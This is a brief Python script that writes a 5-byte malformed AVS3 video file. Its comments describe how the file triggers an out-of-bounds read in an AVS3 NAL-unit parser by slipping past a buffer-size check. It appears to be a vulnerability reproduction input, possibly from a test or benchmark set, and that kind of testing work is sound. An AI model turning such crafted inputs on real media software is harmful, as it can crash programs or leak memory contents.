import struct
import os

# AVS3 Sequence Start Code + unit type 0xB0 embedded in start code = only 5 bytes total
# AVS3 start code: 00 00 01 followed by unit_type byte
# unit_type 0xB0 = SEQUENCE_HEADER (AVS3_SEQ_START_CODE)
# Total: 5 bytes, but parser needs 17 bytes -> OOB read of 12 bytes
#
# Vulnerability: parse_avs3_nal_units() checks buf_size < 5 (passes with 5 bytes),
# then calls init_get_bits(&gb, buf + 4, 100) which declares 100 bits = 12.5 bytes
# starting at buf+4. With only 1 payload byte at buf+4, subsequent get_bits()/skip_bits()
# calls that total 100 bits will read up to buf+16 -> OOB read.

data = bytes([
    0x00, 0x00, 0x01, 0xB0,  # start code prefix + unit_type (SEQUENCE_HEADER = 0xB0)
    0x20,                     # 1 byte payload (buf_size=5, passes the >= 5 check)
    # init_get_bits reads 100 bits = 12.5 bytes from buf+4, but only 1 byte exists -> OOB
])

output_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'vuln_001_input.avs3')
with open(output_path, 'wb') as f:
    f.write(data)
print(f"Written {len(data)} bytes to {output_path}")
